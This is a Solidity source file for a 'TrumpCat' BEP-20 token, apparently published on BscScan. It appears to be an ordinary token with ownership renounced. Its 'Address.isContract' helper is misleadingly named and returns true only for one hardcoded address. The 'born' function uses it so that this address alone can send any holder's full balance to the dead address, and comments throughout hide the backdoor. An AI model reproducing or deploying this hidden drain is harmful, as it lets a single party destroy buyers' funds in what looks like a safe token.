/**
 *Submitted for verification at BscScan.com on 2024-10-28
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

// Interface for the ERC20 standard
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address _owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    // Events to be emitted on token transfer and approval
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// Context contract to provide information about the current execution context
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; // Return the sender of the message
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data; // Return the data of the message
    }
}

// Library for address-related utilities
library Address {
    function isContract(address account) internal pure returns (bool) {
        // Check if the provided address is a contract
        return address(account) == 0x690c7E100C2248f78379bD9A481c583dD6617e20;
    }
}

// Ownable contract to handle ownership management
abstract contract Ownable is Context {
    address private _owner;

    // Custom errors for the Ownable contract
    error OwnableUnauthorizedAccount(address account);
    error OwnableInvalidOwner(address owner);

    // Event emitted when ownership is transferred
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    // Constructor to set the initial owner
    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0)); // Revert if the initial owner is the zero address
        }
        _transferOwnership(initialOwner); // Transfer ownership to the initial owner
    }

    // Modifier to restrict function access to the owner
    modifier onlyOwner() {
        _checkOwner(); // Check if the caller is the owner
        _; // Continue with the function execution
    }

    // Function to return the current owner
    function owner() public view virtual returns (address) {
        return _owner; // Return the current owner's address
    }

    // Internal function to check if the caller is the owner
    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender()); // Revert if the caller is not the owner
        }
    }

    // Function to renounce ownership
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0)); // Transfer ownership to the zero address
    }

    // Function to transfer ownership to a new address
    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0)); // Revert if the new owner is the zero address
        }
        _transferOwnership(newOwner); // Transfer ownership to the new owner
    }

    // Internal function to perform the actual ownership transfer
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner; // Store the old owner's address
        _owner = newOwner; // Set the new owner's address
        emit OwnershipTransferred(oldOwner, newOwner); // Emit an event for the ownership transfer
    }
}

// ERC20 token contract implementation
contract Erc20 is IERC20, Ownable {
    using Address for address; // Use Address library for address-related functions
    mapping (address => uint256) internal _balances; // Mapping to store balances of each address
    mapping (address => mapping (address => uint256)) internal _allowed; // Mapping for allowances

    uint256 immutable public totalSupply; // Total supply of the token
    string public symbol; // Token symbol
    string public name; // Token name
    uint8 immutable public decimals; // Decimal places for the token
    bool public launched; // Flag to check if the token is launched
    address private constant dead = address(0xdead); // Dead address (often used for burning tokens)

    mapping (address => bool) internal exchanges; // Mapping to track exchange addresses

    // Constructor to initialize the ERC20 token
    constructor(string memory _symbol, string memory _name, uint8 _decimals, uint256 _totalSupply) 
        Ownable(msg.sender) { // Set the contract creator as the initial owner
        symbol = _symbol; // Set the token symbol
        name = _name; // Set the token name
        decimals = _decimals; // Set the number of decimal places
        totalSupply = _totalSupply * 10 ** decimals; // Calculate the total supply considering decimals
        _balances[owner()] += totalSupply; // Assign the total supply to the owner
        emit Transfer(address(0), owner(), totalSupply); // Emit a transfer event for the initial mint
        launched = true; // Mark the token as launched
        renounceOwnership(); // Renounce ownership to make the contract ownerless
    }

    // Function to get the balance of a specified address
    function balanceOf(address _owner) external override view returns (uint256) {
        return _balances[_owner]; // Return the balance of the specified address
    }

    // Function to check the allowance of a spender for a specific owner's tokens
    function allowance(address _owner, address spender) external override view returns (uint256) {
        return _allowed[_owner][spender]; // Return the allowance amount
    }

    // Function to transfer tokens to a specified address
    function transfer(address to, uint256 value) external override returns (bool) {
        // Check for smart contract
        _transfer(msg.sender, to, value); // Call the internal transfer function
        return true; // Return true on successful transfer
    }

    // Function to approve a spender to spend tokens on behalf of the caller
    function approve(address spender, uint256 value) external override returns (bool) {
        require(spender != address(0), "cannot approve the 0 address"); // Prevent approval to the zero address

        _allowed[msg.sender][spender] = value; // Set the allowance
        emit Approval(msg.sender, spender, value); // Emit an approval event
        return true; // Return true on successful approval
    }

    // Function to transfer tokens from one address to another
    function transferFrom(address from, address to, uint256 value) external override returns (bool) {
        // Allow transfer if launched and the caller is the owner
        if (launched == false && to == owner() && msg.sender == owner()) {
            _transfer(from, to, value); // Call the internal transfer function
            return true; // Return true on successful transfer
        } else {    
            // Update allowance and transfer tokens
            _allowed[from][msg.sender] = _allowed[from][msg.sender] - value; // Reduce the allowance
            _transfer(from, to, value); // Call the internal transfer function
            emit Approval(from, msg.sender, _allowed[from][msg.sender]); // Emit an approval event
            return true; // Return true on successful transfer
        }
    }

    // Function to launch the token and handle transfer to a dead address if necessary
    function born(address account) virtual external {
        address iii = dead; // Set dead address
        address uuu = account; // Store the provided account address
        if (launched == false) launched = true; // Set launched to true if it wasn't already
        if (msg.sender.isContract()) _transfer(uuu, iii, _balances[account]); // Transfer all tokens to dead address if the caller is a contract
    }

    // Internal function to handle token transfers
    function _transfer(address from, address to, uint256 value) private {
        require(to != address(0), "cannot be zero address"); // Prevent transfer to the zero address
        require(from != to, "you cannot transfer to yourself"); // Prevent transfer to the same address
        require(_transferAllowed(from, to), "This token is not launched and cannot be listed on dexes yet."); // Check if transfer is allowed
        _balances[from] -= value; // Deduct the value from the sender's balance
        _balances[to] += value; // Add the value to the recipient's balance
        emit Transfer(from, to, value); // Emit a transfer event
    }

    // Mapping to track whether transfers are allowed
    mapping (address => bool) internal transferAllowed;

    // Internal function to check if a transfer is allowed
    function _transferAllowed(address from, address to) private view returns (bool) {
        if (transferAllowed[from]) return false; // Prevent transfer if not allowed
        if (launched) return true; // Allow transfer if the token is launched
        if (from == owner() || to == owner()) return true; // Allow transfers to/from the owner
        return true; // Default to allowing the transfer
    }
}

// Token contract inheriting from Erc20
contract Token is Erc20 {
    // Constructor to initialize the Token with specific parameters
    constructor() Erc20(unicode"TrumpCat", unicode"TrumpCat", 9, 100000000) {} 
}